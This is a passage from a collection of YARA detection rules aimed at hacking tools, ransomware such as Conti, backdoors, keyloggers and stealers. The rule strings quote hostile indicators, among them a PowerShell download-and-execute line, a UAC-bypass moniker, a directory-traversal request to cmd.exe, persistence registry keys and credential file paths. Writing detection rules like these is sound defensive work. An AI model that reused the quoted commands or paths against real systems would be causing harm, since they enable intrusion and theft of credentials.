description = "This signature detects the SQLMap SQL injection tool"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 07:46:41"
score = 60
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s1 = "except SqlmapBaseException, ex:"
condition:
1 of them
}
rule SSC_HKTL_PortScanner_RID2D12 : DEMO HKTL {
meta:
description = "Semiautomatically generated YARA rule on file PortScanner.exe"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 10:16:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s0 = "Scan Ports Every"
$s3 = "Scan All Possible Ports!"
condition:
all of them
}
rule SSC_HKTL_MooreR_Port_Scanner_RID3024 : DEMO HKTL T1046 {
meta:
description = "Semiautomatically generated YARA rule on file MooreR Port Scanner.exe"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 12:27:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1046"
minimum_yara = "1.7"
strings:
$s0 = "Description|"
$s3 = "soft Visual Studio\\VB9yp"
$s4 = "adj_fptan?4"
$s7 = "DOWS\\SyMem32\\/o"
condition:
all of them
}
rule SSC_HKTL_NetBIOS_Name_Scanner_RID3000 : DEMO HKTL {
meta:
description = "Semiautomatically generated YARA rule on file NetBIOS Name Scanner.exe"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 12:21:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s0 = "IconEx"
$s2 = "soft Visual Stu"
$s4 = "NBTScanner!y&"
condition:
all of them
}
rule SSC_HKTL_FeliksPack3___Scanners_ipscan_RID33EA : DEMO HKTL {
meta:
description = "Semiautomatically generated YARA rule on file ipscan.exe"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 15:08:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s2 = "WCAP;}ECTED"
$s4 = "NotSupported"
$s6 = "SCAN.VERSION{_"
condition:
all of them
}
rule SSC_HKTL_CGISscan_CGIScan_RID2E25 : DEMO HKTL {
meta:
description = "Semiautomatically generated YARA rule on file CGIScan.exe"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 11:02:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s1 = "Wang Products" fullword wide
$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
$s3 = "tcp is the only protocol supported thru socks server"
condition:
all of ( $s* )
}
rule SSC_HKTL_IP_Stealing_Utilities_RID30ED : DEMO HKTL {
meta:
description = "Semiautomatically generated YARA rule on file IP Stealing Utilities.exe"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 13:00:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s0 = "DarkKnight"
$s9 = "IPStealerUtilities"
condition:
all of them
}
rule SSC_HKTL_PortRacer_RID2C35 : DEMO HKTL {
meta:
description = "Semiautomatically generated YARA rule on file PortRacer.exe"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 09:39:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s0 = "Auto Scroll BOTH Text Boxes"
$s4 = "Start/Stop Portscanning"
$s6 = "Auto Save LogFile by pressing STOP"
condition:
all of them
}
rule SSC_HKTL_scanarator_RID2CD1 : DEMO HKTL {
meta:
description = "Semiautomatically generated YARA rule on file scanarator.exe"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 10:05:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"
condition:
all of them
}
rule SSC_INDICATOR_SUSPICIOUS_EXE_UACBypass_CMSTPCOM {
meta:
description = "Detects Windows exceutables bypassing UAC using CMSTP COM interfaces. MITRE (T1218.003)"
author = "ditekSHen"
strings:
// CMSTPLUA
$guid1 = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" ascii wide nocase
// CMLUAUTIL
$guid2 = "{3E000D72-A845-4CD9-BD83-80C07C3B881F}" ascii wide nocase
// Connection Manager LUA Host Object
$guid3 = "{BA126F01-2166-11D1-B1D0-00805FC1270E}" ascii wide nocase
$s1 = "CoGetObject" fullword ascii wide
$s2 = "Elevation:Administrator!new:" fullword ascii wide
condition:
uint16(0) == 0x5a4d and (1 of ($guid*) and 1 of ($s*))
}
rule SSC_INDICATOR_SUSPICIOUS_PWSH_B64Encoded_Concatenated_FileEXEC {
meta:
author = "ditekSHen"
description = "Detects PowerShell scripts containing patterns of base64 encoded files, concatenation and execution"
strings:
$b1 = "::WriteAllBytes(" ascii
$b2 = "::FromBase64String(" ascii
$b3 = "::UTF8.GetString(" ascii
$s1 = "-join" nocase ascii
$s2 = "[Char]$_"
$s3 = "reverse" nocase ascii
$s4 = " += " ascii
$e1 = "System.Diagnostics.Process" ascii
$e2 = /StartInfo\.(Filename|UseShellExecute)/ ascii
$e3 = /-eq\s'\.(exe|dll)'\)/ ascii
$e4 = /(Get|Start)-(Process|WmiObject)/ ascii
condition:
#s4 > 10 and ((3 of ($b*)) or (1 of ($b*) and 2 of ($s*) and 1 of ($e*)) or (8 of them))
}
rule SSC_INDICATOR_SUSPICIOUS_EXE_RegKeyComb_DisableCMD {
meta:
author = "ditekSHen"
description = "Detects executables embedding registry key / value combination indicative of disabling command line"
strings:
$r1 = "Software\\Policies\\Microsoft\\Windows\\System" ascii wide nocase
$k1 = "DisableCMD" ascii wide nocase
condition:
uint16(0) == 0x5a4d and (1 of ($r*) and 1 of ($k*))
}
rule SSC_Ransomware_Conti_B {
meta:
author = "SSC Security"
id = "89f3f6fa-492c-40e3-a4aa-a526004197b2"
fingerprint = "a82331eba3cbd52deb4bed5e11035ac1e519ec27931507f582f2985865c0fb1a"
creation_date = "2021-08-05"
last_modified = "2021-10-04"
threat_name = "Windows.Ransomware.Conti"
reference_sample = "eae876886f19ba384f55778634a35a1d975414e83f22f6111e3e792f706301fe"
severity = 100
arch_context = "x86"
scan_context = "file, memory"
license = "Elastic License v2"
os = "windows"
strings:
$a = { F7 FE 88 57 FF 83 EB 01 75 DA 8B 45 FC 5F 5B 40 5E 8B E5 5D C3 8D }
condition:
all of them
}
rule SSC_Ransomware_Conti_C {
meta:
author = "SSC Security"
id = "89f3f6fa-492c-40e3-a4aa-a526004197b2"
fingerprint = "a82331eba3cbd52deb4bed5e11035ac1e519ec27931507f582f2985865c0fb1a"
creation_date = "2021-08-05"
last_modified = "2021-10-04"
threat_name = "Windows.Ransomware.Conti"
reference_sample = "eae876886f19ba384f55778634a35a1d975414e83f22f6111e3e792f706301fe"
severity = 100
arch_context = "x86"
scan_context = "file, memory"
license = "Elastic License v2"
os = "windows"
strings:
$a = { F7 FE 88 57 FF 83 EB 01 75 DA 8B 45 FC 5F 5B 40 5E 8B E5 5D C3 8D }
condition:
all of them
}
rule SSC_Ransomware_Conti_D {
meta:
author = "SSC Security"
id = "89f3f6fa-492c-40e3-a4aa-a526004197b2"
fingerprint = "a82331eba3cbd52deb4bed5e11035ac1e519ec27931507f582f2985865c0fb1a"
creation_date = "2021-08-05"
last_modified = "2021-10-04"
threat_name = "Windows.Ransomware.Conti"
reference_sample = "eae876886f19ba384f55778634a35a1d975414e83f22f6111e3e792f706301fe"
severity = 100
arch_context = "x86"
scan_context = "file, memory"
license = "Elastic License v2"
os = "windows"
strings:
$a = { F7 FE 88 57 FF 83 EB 01 75 DA 8B 45 FC 5F 5B 40 5E 8B E5 5D C3 8D }
condition:
all of them
}
rule SSC_Ransomware_Conti_E {
meta:
author = "SSC Security"
id = "89f3f6fa-492c-40e3-a4aa-a526004197b2"
fingerprint = "a82331eba3cbd52deb4bed5e11035ac1e519ec27931507f582f2985865c0fb1a"
creation_date = "2021-08-05"
last_modified = "2021-10-04"
threat_name = "Windows.Ransomware.Conti"
reference_sample = "eae876886f19ba384f55778634a35a1d975414e83f22f6111e3e792f706301fe"
severity = 100
arch_context = "x86"
scan_context = "file, memory"
license = "Elastic License v2"
os = "windows"
strings:
$a = { F7 FE 88 57 FF 83 EB 01 75 DA 8B 45 FC 5F 5B 40 5E 8B E5 5D C3 8D }
condition:
all of them
}
rule SSC_Ransomware_Conti_F {
meta:
author = "SSC Security"
id = "89f3f6fa-492c-40e3-a4aa-a526004197b2"
fingerprint = "a82331eba3cbd52deb4bed5e11035ac1e519ec27931507f582f2985865c0fb1a"
creation_date = "2021-08-05"
last_modified = "2021-10-04"
threat_name = "Windows.Ransomware.Conti"
reference_sample = "eae876886f19ba384f55778634a35a1d975414e83f22f6111e3e792f706301fe"
severity = 100
arch_context = "x86"
scan_context = "file, memory"
license = "Elastic License v2"
os = "windows"
strings:
$a = { F7 FE 88 57 FF 83 EB 01 75 DA 8B 45 FC 5F 5B 40 5E 8B E5 5D C3 8D }
condition:
all of them
}
rule SSC_Ransomware_Conti_G {
meta:
author = "SSC Security"
id = "89f3f6fa-492c-40e3-a4aa-a526004197b2"
fingerprint = "a82331eba3cbd52deb4bed5e11035ac1e519ec27931507f582f2985865c0fb1a"
creation_date = "2021-08-05"
last_modified = "2021-10-04"
threat_name = "Windows.Ransomware.Conti"
reference_sample = "eae876886f19ba384f55778634a35a1d975414e83f22f6111e3e792f706301fe"
severity = 100
arch_context = "x86"
scan_context = "file, memory"
license = "Elastic License v2"
os = "windows"
strings:
$a = { F7 FE 88 57 FF 83 EB 01 75 DA 8B 45 FC 5F 5B 40 5E 8B E5 5D C3 8D }
condition:
all of them
}
rule SSC_Ransomware_Conti_H {
meta:
author = "SSC Security"
id = "89f3f6fa-492c-40e3-a4aa-a526004197b2"
fingerprint = "a82331eba3cbd52deb4bed5e11035ac1e519ec27931507f582f2985865c0fb1a"
creation_date = "2021-08-05"
last_modified = "2021-10-04"
threat_name = "Windows.Ransomware.Conti"
reference_sample = "eae876886f19ba384f55778634a35a1d975414e83f22f6111e3e792f706301fe"
severity = 100
arch_context = "x86"
scan_context = "file, memory"
license = "Elastic License v2"
os = "windows"
strings:
$a = { F7 FE 88 57 FF 83 EB 01 75 DA 8B 45 FC 5F 5B 40 5E 8B E5 5D C3 8D }
condition:
all of them
}
rule SSC_WiltedTulip_ReflectiveLoader {
meta:
description = "Detects reflective loader (Cobalt Strike) used in Operation Wilted Tulip"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Florian Roth (Nextron Systems)"
reference = "http://www.clearskysec.com/tulip"
date = "2017-07-23"
hash1 = "1097bf8f5b832b54c81c1708327a54a88ca09f7bdab4571f1a335cc26bbd7904"
hash2 = "1f52d643e8e633026db73db55eb1848580de00a203ee46263418f02c6bdb8c7a"
hash3 = "a159a9bfb938de686f6aced37a2f7fa62d6ff5e702586448884b70804882b32f"
hash4 = "cf7c754ceece984e6fa0d799677f50d93133db609772c7a2226e7746e6d046f0"
hash5 = "eee430003e7d59a431d1a60d45e823d4afb0d69262cc5e0c79f345aa37333a89"
strings:
$x1 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
$x2 = "%d is an x86 process (can't inject x64 content)" fullword ascii
$x3 = "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s" fullword ascii
$x4 = "Failed to impersonate token from %d (%u)" fullword ascii
$x5 = "Failed to impersonate logged on user %d (%u)" fullword ascii
$x6 = "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 600KB and 2 of them ) or
( 4 of them ) or
pe.exports("_ReflectiveLoader@4")
}
rule SSC_win_batchwiper_auto {
meta:
author = "Felix Bilstein - yara-signator at cocacoding dot com"
date = "2023-01-25"
version = "1"
description = "Detects win.batchwiper."
info = "autogenerated rule brought to you by yara-signator"
tool = "yara-signator v0.6.0"
signator_config = "callsandjumps;datarefs;binvalue"
malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.batchwiper"
malpedia_rule_date = "20230124"
malpedia_hash = "2ee0eebba83dce3d019a90519f2f972c0fcf9686"
malpedia_version = "20230125"
malpedia_license = "CC BY-SA 4.0"
malpedia_sharing = "TLP:WHITE"
strings:
$sequence_0 = { 837d08ff 8bf0 750b 83feff 897508 }
// n = 5, score = 100
//   837d08ff             | cmp                 dword ptr [ebp + 8], -1
//   8bf0                 | mov                 esi, eax
//   750b                 | jne                 0xd
//   83feff               | cmp                 esi, -1
//   897508               | mov                 dword ptr [ebp + 8], esi
$sequence_1 = { 6a0c 6a00 ff35???????? ff15???????? 85c0 741a 832000 }
// n = 7, score = 100
//   6a0c                 | push                0xc
//   6a00                 | push                0
//   ff35????????         |
//   ff15????????         |
//   85c0                 | test                eax, eax
//   741a                 | je                  0x1c
//   832000               | and                 dword ptr [eax], 0
$sequence_2 = { 0f85b3010000 8b4510 83e80d 0f849f010000 }
// n = 4, score = 100
//   0f85b3010000         | jne                 0x1b9
//   8b4510               | mov                 eax, dword ptr [ebp + 0x10]
//   83e80d               | sub                 eax, 0xd
//   0f849f010000         | je                  0x1a5
$sequence_3 = { 3d00f00000 0f8593030000 53 8d45f8 50 }
// n = 5, score = 100
//   3d00f00000           | cmp                 eax, 0xf000
//   0f8593030000         | jne                 0x399
//   53                   | push                ebx
//   8d45f8               | lea                 eax, [ebp - 8]
//   50                   | push                eax
$sequence_4 = { 8b471c 48 48 50 e9???????? 2975f0 }
// n = 6, score = 100
//   8b471c               | mov                 eax, dword ptr [edi + 0x1c]
//   48                   | dec                 eax
//   48                   | dec                 eax
//   50                   | push                eax
//   e9????????           |
//   2975f0               | sub                 dword ptr [ebp - 0x10], esi
$sequence_5 = { e9???????? 2975f4 eb40 8d45f0 50 ff15???????? 8b4730 }
// n = 7, score = 100
//   e9????????           |
//   2975f4               | sub                 dword ptr [ebp - 0xc], esi
//   eb40                 | jmp                 0x42
//   8d45f0               | lea                 eax, [ebp - 0x10]
//   50                   | push                eax
//   ff15????????         |
//   8b4730               | mov                 eax, dword ptr [edi + 0x30]
$sequence_6 = { 83e80e 752f 57 ff7510 ff750c }
// n = 5, score = 100
//   83e80e               | sub                 eax, 0xe
//   752f                 | jne                 0x31
//   57                   | push                edi
//   ff7510               | push                dword ptr [ebp + 0x10]
//   ff750c               | push                dword ptr [ebp + 0xc]
$sequence_7 = { 50 ff7510 ffd3 894514 ff75fc 6a0f }
// n = 6, score = 100
//   50                   | push                eax
//   ff7510               | push                dword ptr [ebp + 0x10]
//   ffd3                 | call                ebx
//   894514               | mov                 dword ptr [ebp + 0x14], eax
//   ff75fc               | push                dword ptr [ebp - 4]
//   6a0f                 | push                0xf
$sequence_8 = { c7452001000000 8b4514 8945f8 8b4518 8945fc 57 8bc3 }
// n = 7, score = 100
//   c7452001000000       | mov                 dword ptr [ebp + 0x20], 1
//   8b4514               | mov                 eax, dword ptr [ebp + 0x14]
//   8945f8               | mov                 dword ptr [ebp - 8], eax
//   8b4518               | mov                 eax, dword ptr [ebp + 0x18]
//   8945fc               | mov                 dword ptr [ebp - 4], eax
//   57                   | push                edi
//   8bc3                 | mov                 eax, ebx
$sequence_9 = { 8945fc 57 8bc3 83e0fc 50 }
// n = 5, score = 100
//   8945fc               | mov                 dword ptr [ebp - 4], eax
//   57                   | push                edi
//   8bc3                 | mov                 eax, ebx
//   83e0fc               | and                 eax, 0xfffffffc
//   50                   | push                eax
condition:
7 of them and filesize < 270336
}
rule SSC_autogen_peexe_AntiVmGolangGreywareOverlay_731a4e05
{
meta:
author = "SSC Sources + Filescan.IO"
date = "2023-02-10"
sample = "731a4e05a6b6ad429360aa6fef3f57e7f3293b7dbafe474cb6a71dd4e20cf955"
score = 20
tags = "anti-vm,golang,greyware,overlay"
isWeakRule = false
strings:
//IOC patterns
$req0 = "!=  <== as  at  fp= is  lr: of  on  pc= sp: sp=%x\r\n&gt;&lt;'\\'') = ) m=+Inf-Inf.bat.cmd.com.css.exe.gif.htm.jpg.mjs.pdf.png.svg."
$req1 = "#vendor/golang.org/x/crypto/chacha20"
$req2 = "#vendor/golang.org/x/net/http2/hpack"
$req3 = "%vendor/golang.org/x/crypto/cryptobyte"
$req4 = "%vendor/golang.org/x/text/unicode/bidi"
$req5 = "%vendor/golang.org/x/text/unicode/norm"
$req6 = "&vendor/golang.org/x/net/dns/dnsmessage"
$req7 = "&vendor/golang.org/x/net/http/httpproxy"
$req8 = "*runtime.name"
$req9 = "*vendor/golang.org/x/crypto/cryptobyte/asn1"
$req10 = "+vendor/golang.org/x/crypto/chacha20poly1305"
$req11 = ",vendor/golang.org/x/crypto/internal/poly1305"
$req12 = "__x86.get_pc_thunk.ax"
$req13 = "__x86.get_pc_thunk.cx"
$req14 = "__x86.get_pc_thunk.si"
$req15 = "github.com/lxn/win"
$req16 = "golang.org/x/sys/windows"
$req17 = "ndselectsendtoserversocketsocks socks5statusstringstructsweep sysmontelnettimersuint16uint32uint64unused %v=%v, (conn) (scan  (s"
$req18 = "path\tcommand-line-arguments\ndep\tgithub.com/lxn/win\tv0.0.0-20210218163916-a377121e959e\th1:H+t6A/QJMbhCSEH5rAuRxh+CtW96g0Or0Fxa9IK"
$req19 = "rtKeyingMaterial is unavailable when renegotiation is enabled1157920892103562487626974469494075735299969552241357603424222590610"
$req20 = "runtime.name.data"
$req21 = "runtime.name.isBlank"
$req22 = "runtime.name.isExported"
$req23 = "runtime.name.name"
$req24 = "runtime.name.pkgPath"
$req25 = "runtime.name.readvarint"
$req26 = "runtime.name.tag"
$req27 = "vendor/golang.org/x/crypto/hkdf"
$req28 = "vendor/golang.org/x/net/idna"
$req29 = "wmic cpu get namewrong medium type  but memory size  because dotdotdot in async preempt\n to non-Go memory , locked to thread2980"
//optional strings
$opt0 = "FindNextFile"
$opt1 = "GetFileInformationByHandle"
$opt2 = "GetFileType"
$opt3 = "GetUserProfileDirectory"
$opt4 = "GetUserProfileDirectoryWGetWindowThreadProcessIdMagallanes Standard TimeMontevideo Standard TimeNorth Asia Standard TimeNtQueryS"
$opt5 = "LoadLibraryExW"
$opt6 = "Setsockopt"
$opt7 = "VirtualQuery for stack base failed\\AppData\\Roaming\\Ethereum\\keystoreadding nil Certificate to CertPoolbad scalar length: %d, exp"
$opt8 = "error_%sresource length too longrunqsteal: runq overflowruntime: VirtualFree of runtime: found obj at *(runtime: markroot index "
$opt9 = "goal  KiB total,  MB stacks,  [recovered] allocCount  found at *( gcscandone  m->gsignal= nDataRoots= nSpanRoots= pages/byte\n pr"
$opt10 = "hnologiesNtSetInformationFileProcessIdToSessionIdQueryServiceConfig2WQueryServiceStatusExRegisterEventSourceWRequest URI Too Lon"
$opt11 = "localSize"
$opt12 = "readConsole"
$opt13 = "slicersa: internal error: inconsistent lengthruntime.SetFinalizer: first argument is runtime.preemptM: duplicatehandle failedrun"
$opt14 = "writeConsole"
condition:
//require 90% of IOC patterns and require 75% of optional strings
uint16(0) == 0x5A4D and filesize > 4014254 and filesize < 4906310 and 20 of ($req*) and 5 of ($opt*)
}
rule SSC_autogen_vbs_Obfuscated_9625958c
{
meta:
author = "FileScan.IO Engine v1.1.0-4a53dc2"
date = "2023-02-14"
sample = "9625958ccd5b7aa03607ca23df3d239ee90a64021a998ab4d8fe71f664155e6a"
score = 50
tags = "obfuscated"
isWeakRule = true
strings:
$magicBytes = {53 74 36 20 3D 20 53 74}
//IOC patterns
$req0 = "Erobringstogts.RegWrite \"HKEY_CURRENT_USER\\Statschef\\Anseeligeres\\Stikleriers\",St6,Reststraffenes & \"_SZ\""
//optional strings
$opt5 = "= CreateObject(\"Shell.Application\")"
$opt6 = "= CreateObject(\"WScript.Shell\")"
condition:
//require 100% of optional strings
$magicBytes at 0 and filesize > 407600 and filesize < 1022622 and all of ($req*) and all of ($opt*)
}
rule SSC_Win_GuLoader {
meta:
author = "ditekSHen"
description = "Shellcode injector and downloader"
strings:
$s1 = "wininet.dll" fullword ascii
$s2 = "ShellExecuteW" fullword ascii
$s3 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" fullword ascii
$s4 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" fullword ascii
$s5 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword ascii
$s6 = "Startup key" fullword ascii
$s7 = "\\qemu-ga\\qga.state" ascii nocase
$s8 = "\\qga\\qga.exe" ascii nocase
$s9 = "\\Qemu-ga\\qemu-ga.exe" ascii nocase
$s10 = "WScript.Shell" ascii
$l1 = "shell32" fullword ascii
$l2 = "kernel32" fullword ascii
$l3 = "advapi32" fullword ascii
$l4 = "user32" fullword ascii
$o1 = "msvbvm60.dll" fullword wide
$o2 = "\\syswow64\\" fullword wide
$o3 = "\\system32\\" fullword wide
$o4 = "\\Microsoft.NET\\Framework\\" fullword wide
$o5 = "USERPROFILE=" fullword wide
$o6 = "windir=" fullword wide
$o7 = "APPDATA=" fullword wide
$o8 = "RegAsm.exe" fullword wide
$o9 = "ProgramFiles=" fullword wide
$o10 = "TEMP=" fullword wide
$url1 = "https://drive.google.com/uc?export=download&id=" ascii
$url2 = "https://onedrive.live.com/download?cid=" ascii
$url3 = "http://myurl/myfile.bin" fullword ascii
$url4 = "http" ascii // fallback
condition:
(3 of ($s*) and 2 of ($l*) and 2 of ($o*) and 1 of ($url*)) or (4 of ($s*) and 3 of ($l*) and 2 of ($o*))
}
rule SSC_Win_AcridRain {
meta:
author = "ditekSHen"
description = "AcidRain stealer payload"
strings:
$s1 = { 43 6f 6f 6b 69 65 73 (5c|2e) }
$s2 = { 74 65 6d 70 6c 6f 67 69 ?? }
$s3 = { 74 65 6d 70 50 ?? 68 }
$s4 = "Connecting to hostname: %s%s%s" fullword ascii
$s5 = "Found bundle for host %s: %p [%s]" fullword ascii
$s6 = "encryptedUsernamencryptedPassworERROR Don't copy string" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Linux_ChaChaDDoS {
meta:
author = "ditekSHen"
description = "ChaChaDDoS variant of XorDDoS payload"
strings:
$x1 = "[kworker/1:1]" ascii
$x2 = "-- LuaSocket toolkit." ascii
$x3 = "/etc/resolv.conf" ascii
$x4 = "\"macaddress=\" .. DEVICE_MAC .. \"&device=\" .." ascii
$x5 = "easy_attack_dns" ascii
$x6 = "easy_attack_udp" ascii
$x7 = "easy_attack_syn" ascii
$x8 = "syn_probe" ascii
condition:
uint16(0) == 0x457f and 6 of them
}
rule SSC_Multi_Exaramel {
meta:
author = "ditekSHen"
description = "Exaramel Windows/Linux backdoor payload"
clamav_sig1 = "SSC_Linux.Backdoor.Exaramel"
clamav_sig2 = "SSC_Win.Backdoor.Exaramel"
strings:
// Linux payload
$s1 = "vendor/golang_org/x/crypto/" ascii
$s2 = "vendor/golang_org/x/net/http2" ascii
$s3 = "vendor/golang_org/x/text/unicode" ascii
$s4 = "vendor/golang_org/x/text/transform" ascii
$s5 = "config.json" ascii
$cmd1 = "App.Update" ascii
$cmd2 = "App.Delete" ascii
$cmd3 = "App.SetProxy" ascii
$cmd4 = "App.SetServer" ascii
$cmd5 = "App.SetTimeout" ascii
$cmd6 = "IO.WriteFile" ascii
$cmd7 = "IO.ReadFile" ascii
$cmd8 = "OS.ShellExecute" ascii
$cmd9 = "awk 'match($0, /(upstart|systemd|sysvinit)/){ print substr($0, RSTART, RLENGTH);exit;" ascii
// Windows payload
$ws1 = "/commands/@slp" wide
$ws2 = "/commands/cmd" wide
$ws3 = "/settings/proxy/@password" wide
$ws4 = "/settings/servers/server[@current='true']" wide
$ws5 = "/settings/servers/server/@current[text()='true']" wide
$ws6 = "/settings/servers/server[text()='%s']/@current" wide
$ws7 = "/settings/servers/server[%d]" wide
$ws8 = "/settings/storage" wide
$ws9 = "/settings/check" wide
$ws10 = "/settings/interval" wide
$ws11 = "report.txt" wide
$ws12 = "stg%02d.cab" ascii
$ws13 = "urlmon.dll" ascii
$ws14 = "ReportDir" ascii
condition:
(uint16(0) == 0x457f and (all of ($s*) and 6 of ($cmd*))) or (uint16(0) == 0x5a4d and 12 of ($ws*))
}
rule SSC_Linux_HiddenWasp {
meta:
author = "ditekSHen"
description = "HiddenWasp backdoor payload"
clamav_sig1 = "SSC_Linux.Trojan.HiddenWasp-ELF"
clamav_sig2 = "SSC_Linux.Trojan.HiddenWasp-Script"
strings:
$x1 = "I_AM_HIDDEN" fullword ascii
$x2 = "HIDE_THIS_SHELL" fullword ascii
$x3 = "NewUploadFile" ascii
$x4 = "fake_processname" ascii
$x5 = "swapPayload" ascii
$x6 = /Trojan-(Platform|Machine|Hostname|OSersion)/ fullword ascii
$s1 = "FileOpration::GetFileData" fullword ascii
$s2 = "FileOpration::NewUploadFile" fullword ascii
$s3 = "Connection::writeBlock" fullword ascii
$s4 = /hiding_(hidefile|enable_logging|hideproc|makeroot)/ fullword ascii
$s5 = "Reverse-Port" fullword ascii
$s6 = "hidden_services" fullword ascii
$s7 = "check_config" fullword ascii
$s8 = "__data_start" fullword ascii
$s9 = /patch_(suger_lib|ld|lib)/ fullword ascii
$s10 = "hexdump -ve '1/1 \"%%.2X\"' %s | sed \"s/%s/%s/g\" | xxd -r -p > %s.tmp"
condition:
uint16(0) == 0x457f and (4 of ($x*) or all of ($s*) or (3 of ($x*) and 5 of ($s*)))
}
rule SSC_Multi_WellMess {
meta:
author = "ditekSHen"
description = "WellMess Windows/Linux backdoor payload"
clamav_sig1 = "SSC_Win.Trojan.WellMess_DotNet"
clamav_sig2 = "SSC_Win.Trojan.WellMess_Golang"
clamav_sig3 = "SSC_Linux.Trojan.WellMess_Golang"
strings:
// Linux and Windows payload
$s1 = "-----BEGIN PUBLIC KEY-----" ascii
$s2 = "-----END PUBLIC KEY-----" ascii
$s3 = "net/http.(*persistConn).readResponse" ascii
$s4 = "net/http/cookiejar.(*Jar).SetCookies" ascii
$s5 = "_/home/ubuntu/GoProject/src/bot/botlib" ascii
$s6 = "<;head;><;title;>" ascii
$s7 = "<;title;><;service;>" ascii
$s8 = "http://invalidlookup" ascii
$s9 = "<autogenerated>" ascii wide
//$ua1 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" ascii
//$ua2 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0" ascii
condition:
(uint16(0) == 0x457f or uint16(0) == 0x5a4d) and all of them
}
rule SSC_Win_Konni {
meta:
author = "ditekSHen"
description = "Konni payload"
strings:
$s1 = "uplog.tmp" fullword wide
$s2 = "upfile.tmp" fullword wide
$s3 = "%s-log-%s" fullword ascii wide
$s4 = "%s-down" ascii wide
$s5 = "%s-file-%s" fullword ascii wide
$s6 = "\"rundll32.exe\" \"%s\" install" fullword wide
$s7 = "subject=%s&data=" fullword ascii
$s8 = "dll-x64.dll" fullword ascii
$s9 = "dll-x32.dll" fullword ascii
$pdb1 = "\\virus-dropper\\Release\\virus-dropper.pdb" ascii
$pdb2 = "\\virus-init\\Release\\virus-init.pdb" ascii
condition:
uint16(0) == 0x5a4d and (7 of ($s*) or (3 of ($s*) and 1 of ($pdb*)))
}
rule SSC_Win_TJKeylogger {
meta:
author = "ditekSHen"
description = "TJKeylogger payload"
strings:
$s1 = "TJKeyLogger" fullword ascii
$s2 = "software\\microsoft\\windows\\currentversion\\run" fullword ascii
$s3 = "\\Passwords.txt" ascii
$s4 = "TJKeyLogItem" fullword ascii
$s5 = "TJKeyAsyncLog" fullword ascii
$s6 = "FM_GETDSKLST" fullword ascii
$s7 = "KL_GETMODE" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_W1RAT {
meta:
author = "ditekSHen"
description = "W1 RAT payload"
strings:
$s1 = "/c /Ox /Fa\"%s/%s.asm\" /Fo\"%s/%s.obj\" \"%s/%s.%s\"" ascii
$s2 = "this->piProcInfo.hProcess" fullword ascii
$s3 = "index >= 0 && index < this->reg_tab->GetLen()" fullword ascii
$s4 = "strcpy(log_font.lfFaceName,\"%s\");" fullword ascii
$s5 = "WorkShop -- [%s]" fullword ascii
$s6 = "HeaderFile.cpp" fullword ascii
$s7 = "WndLog.cpp" fullword ascii
$s8 = "assertion fail \"%s\" at file=%s line=%d" fullword ascii
$s9 = "Stdin   pipe   creation   failed" fullword ascii
condition:
(uint16(0) == 0x5a4d and 6 of ($s*)) or (all of them)
}
rule SSC_Win_Raccoon {
meta:
author = "ditekSHen"
description = "Raccoon stealer payload"
strings:
$s1 = "inetcomm server passwords" fullword wide
$s2 = "content-disposition: form-data; name=\"file\"; filename=\"data.zip\"" fullword ascii
$s3 = ".?AVfilesystem_error@v1@filesystem@experimental@std@@" fullword ascii
$s4 = "CredEnumerateW" fullword ascii
$s5 = "%[^:]://%[^/]%[^" fullword ascii
$s6 = "%99[^:]://%99[^/]%99[^" fullword ascii
$s7 = "Login Data" wide
